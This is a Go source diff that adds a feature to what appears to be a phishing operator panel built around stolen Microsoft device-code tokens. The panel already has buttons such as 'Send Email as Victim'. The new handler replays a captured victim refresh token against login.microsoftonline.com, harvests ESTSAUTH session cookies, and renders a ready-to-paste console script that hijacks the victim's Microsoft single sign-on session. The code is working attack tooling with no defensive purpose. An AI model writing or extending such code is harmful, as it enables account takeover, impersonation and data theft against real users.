@@ -10,6 +10,7 @@ import (
 	"io"
 	"net/http"
 	"net/http/cookiejar"
+	"net/url"
 	"regexp"
 	"strings"
 	"sync"
@@ -56,6 +57,7 @@ func NewHttpServer() (*HttpServer, error) {
 	r.HandleFunc("/dc/send/{token}", s.handleDCSend).Methods("GET", "POST")
 	r.HandleFunc("/dc/drive/{token}", s.handleDCDrive).Methods("GET")
 	r.HandleFunc("/dc/inject/{token}", s.handleDCInject).Methods("GET")
+	r.HandleFunc("/dc/estscookies/{token}", s.handleDCESTSCookies).Methods("GET")
 	r.PathPrefix("/dc/owa/").HandlerFunc(s.handleDCOWA)
 	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
 	// User panels
@@ -440,6 +442,7 @@ tr:hover td{background:#1e1e1e}
 <a class="btn b1" href="/dc/send/%s">Send Email as Victim</a>
 <a class="btn b2" href="/dc/drive/%s">OneDrive Files</a>
 <a class="btn b2" href="/dc/inbox/%s">Full Inbox</a>
+<a class="btn b2" href="/dc/estscookies/%s">ESTS Login Cookies</a>
 </div>
 <p class="sect">Tokens</p>
 <div class="actions">
@@ -474,6 +477,7 @@ function cp(s){navigator.clipboard.writeText(s);var o=document.getElementById('o
 		template.HTMLEscapeString(landingToken), // send
 		template.HTMLEscapeString(landingToken), // drive
 		template.HTMLEscapeString(landingToken), // inbox
+		template.HTMLEscapeString(landingToken), // estscookies
 		template.HTMLEscapeString(u.DisplayName),
 		template.HTMLEscapeString(u.Mail),
 		template.HTMLEscapeString(u.JobTitle),
@@ -1283,6 +1287,215 @@ ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999)
 		template.HTMLEscapeString(owaClientID),
 		template.HTMLEscapeString(homeAccountID),
 		string(snippetJSON),
+	)
+}
+
+// handleDCESTSCookies does a server-side token refresh against login.microsoftonline.com
+// with a cookie jar, collects the ESTSAUTH* session cookies that Microsoft sets, and
+// renders a ready-to-paste JS script the admin can run in the browser console to inject
+// those cookies and get a full authenticated session on login.microsoftonline.com.
+func (s *HttpServer) handleDCESTSCookies(w http.ResponseWriter, r *http.Request) {
+	tgt := GetTargetByToken(mux.Vars(r)["token"])
+	if tgt == nil {
+		http.NotFound(w, r)
+		return
+	}
+	tgt.mu.Lock()
+	rt := tgt.RefreshToken
+	tenant := tgt.Tenant
+	email := tgt.Email
+	landingToken := tgt.LandingToken
+	tgt.mu.Unlock()
+
+	if rt == "" {
+		http.Error(w, "no refresh token captured yet — victim has not approved", http.StatusBadRequest)
+		return
+	}
+	if tenant == "" {
+		tenant = "common"
+	}
+
+	// Make a token refresh request with a cookie jar so Microsoft sets ESTS cookies.
+	jar, _ := cookiejar.New(nil)
+	client := &http.Client{
+		Jar:     jar,
+		Timeout: 20 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			if len(via) > 10 {
+				return http.ErrUseLastResponse
+			}
+			return nil
+		},
+	}
+
+	form := "grant_type=refresh_token" +
+		"&refresh_token=" + url.QueryEscape(rt) +
+		"&client_id=1950a258-227b-4e31-a9cf-717495945fc2" +
+		"&scope=" + url.QueryEscape("openid profile email offline_access") +
+		"&claims=" + url.QueryEscape(`{"access_token":{"xms_cc":{"values":["CP1"]}}}`)
+
+	tokenURL := "https://login.microsoftonline.com/" + tenant + "/oauth2/v2.0/token"
+	req, _ := http.NewRequest("POST", tokenURL, strings.NewReader(form))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+	req.Header.Set("Origin", "https://login.microsoftonline.com")
+	req.Header.Set("Accept", "application/json, text/plain, */*")
+	client.Do(req) //nolint — we only care about cookies in the jar
+
+	// Also hit the authorize endpoint to get interactive ESTS cookies
+	authURL := "https://login.microsoftonline.com/" + tenant +
+		"/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2" +
+		"&response_type=code&redirect_uri=" + url.QueryEscape("https://login.microsoftonline.com/common/oauth2/nativeclient") +
+		"&scope=" + url.QueryEscape("openid profile email offline_access") +
+		"&prompt=none&login_hint=" + url.QueryEscape(email)
+	req2, _ := http.NewRequest("GET", authURL, nil)
+	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+	req2.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	client.Do(req2) //nolint
+
+	// Collect ESTS cookies from jar
+	msLoginURL, _ := url.Parse("https://login.microsoftonline.com")
+	allCookies := jar.Cookies(msLoginURL)
+
+	type cookieEntry struct {
+		Name     string `json:"name"`
+		Value    string `json:"value"`
+		Domain   string `json:"domain"`
+		Path     string `json:"path"`
+		Secure   bool   `json:"secure"`
+		HTTPOnly bool   `json:"httpOnly"`
+	}
+
+	var entries []cookieEntry
+	wantNames := map[string]bool{
+		"ESTSAUTH":           true,
+		"ESTSAUTHPERSISTENT": true,
+		"ESTSAUTHLIGHT":      true,
+		"buid":               true,
+		"esctx":              true,
+		"fpc":                true,
+	}
+	for _, c := range allCookies {
+		if wantNames[c.Name] {
+			entries = append(entries, cookieEntry{
+				Name:     c.Name,
+				Value:    c.Value,
+				Domain:   ".login.microsoftonline.com",
+				Path:     "/",
+				Secure:   true,
+				HTTPOnly: true,
+			})
+		}
+	}
+
+	// Build injection script matching user's reference format
+	cookieJSON, _ := json.Marshal(entries)
+	// base64("https://login.microsoftonline.com")
+	msLoginB64 := base64.StdEncoding.EncodeToString([]byte("https://login.microsoftonline.com"))
+
+	var scriptBuf strings.Builder
+	scriptBuf.WriteString("!function(){\n")
+	scriptBuf.WriteString("  let e=JSON.parse(`")
+	scriptBuf.Write(cookieJSON)
+	scriptBuf.WriteString("`);\n")
+	scriptBuf.WriteString("  for(let o of e){\n")
+	scriptBuf.WriteString("    document.cookie=o.name+'='+o.value+'; domain='+o.domain+'; path='+o.path+'; secure';\n")
+	scriptBuf.WriteString("  }\n")
+	scriptBuf.WriteString("  window.location.href=atob('")
+	scriptBuf.WriteString(msLoginB64)
+	scriptBuf.WriteString("');\n")
+	scriptBuf.WriteString("}();")
+	script := scriptBuf.String()
+
+	found := len(entries) > 0
+	statusNote := ""
+	if !found {
+		statusNote = `<div style="background:#3a1a1a;border:1px solid #7a2a2a;border-radius:4px;padding:10px 14px;margin-bottom:14px;font-size:13px;color:#e07070">
+No ESTS cookies were obtained. Microsoft may not have set them for this token type.<br>
+The snippet below will run but the cookie list will be empty — try the <strong>Inject Browser Session</strong> approach instead.
+</div>`
+	}
+
+	scriptJSON, _ := json.Marshal(script)
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<title>ESTS Cookies — %s</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
+h1{font-size:18px;color:#fff;margin-bottom:4px}
+.sub{font-size:12px;color:#666;margin-bottom:20px}
+.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
+h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
+.steps{list-style:none;counter-reset:s}
+.steps li{counter-increment:s;padding:10px 0 10px 38px;position:relative;font-size:13px;color:#bbb;border-bottom:1px solid #1c1c1c}
+.steps li:last-child{border-bottom:none}
+.steps li::before{content:counter(s);position:absolute;left:0;top:10px;background:#0078d4;color:#fff;width:24px;height:24px;border-radius:50%%;font-size:11px;font-weight:700;text-align:center;line-height:24px}
+.steps a{color:#0078d4}.steps strong{color:#fff}
+textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:12px 14px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre;height:120px;resize:none;outline:none;cursor:text}
+.row{display:flex;gap:8px;align-items:center;margin-top:10px;flex-wrap:wrap}
+.btn{padding:9px 22px;border-radius:4px;font-size:13px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff;text-decoration:none;display:inline-block}
+.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a}
+.ok{color:#5cb85c;font-size:13px;font-weight:600;display:none}
+.back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:16px}
+.note{font-size:11px;color:#555;margin-top:8px}
+.badge{display:inline-block;background:#107c10;color:#fff;font-size:10px;padding:2px 8px;border-radius:3px;margin-left:6px;vertical-align:middle}
+</style></head><body>
+<a class="back" href="/dc/use/%s">&larr; Dashboard</a>
+<h1>ESTS Login Cookies <span class="badge">%d cookies</span></h1>
+<p class="sub">Inject Microsoft SSO session cookies into your browser</p>
+%s
+<div class="card">
+<h2>Steps</h2>
+<ol class="steps">
+<li>Open <a href="https://login.microsoftonline.com" target="_blank"><strong>login.microsoftonline.com</strong></a> in your browser (logged out is fine)</li>
+<li>Press <strong>F12</strong> → <strong>Console</strong> tab</li>
+<li>Click <strong>Copy Script</strong>, paste in console, press <strong>Enter</strong></li>
+<li>Page redirects to Microsoft login — you should be automatically signed in as <strong>%s</strong></li>
+</ol>
+</div>
+<div class="card">
+<h2>Injection Script</h2>
+<textarea class="code" id="ta" readonly>%s</textarea>
+<div class="row">
+<button class="btn" onclick="doCopy()">Copy Script</button>
+<a class="btn b2" href="https://login.microsoftonline.com" target="_blank" onclick="doCopy()">Copy &amp; Open Login</a>
+<span class="ok" id="ok">Copied!</span>
+</div>
+<p class="note">If copy fails: click inside the box, press Ctrl+A then Ctrl+C</p>
+</div>
+<div class="card" style="font-size:12px;color:#555;line-height:1.9">
+  <div>Target: <span style="color:#888">%s</span></div>
+  <div>Tenant: <span style="color:#888">%s</span></div>
+  <div>Cookies obtained: <span style="color:#888">%d</span></div>
+</div>
+<script>
+var snippet=%s;
+var ta=document.getElementById('ta');
+function doCopy(){
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(snippet).then(showOk).catch(legacyCopy);
+  } else { legacyCopy(); }
+}
+function legacyCopy(){
+  ta.select();ta.setSelectionRange(0,99999);
+  try{if(document.execCommand('copy'))showOk();}catch(e){}
+}
+function showOk(){var o=document.getElementById('ok');o.style.display='inline';setTimeout(function(){o.style.display='none';},2500);}
+ta.addEventListener('click',function(){ta.select();ta.setSelectionRange(0,99999);});
+ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999);});
+</script>
+</body></html>`,
+		template.HTMLEscapeString(email),
+		template.HTMLEscapeString(landingToken),
+		len(entries),
+		statusNote,
+		template.HTMLEscapeString(email),
+		template.HTMLEscapeString(script),
+		template.HTMLEscapeString(email),
+		template.HTMLEscapeString(tenant),
+		len(entries),
+		string(scriptJSON),
 	)
 }
 
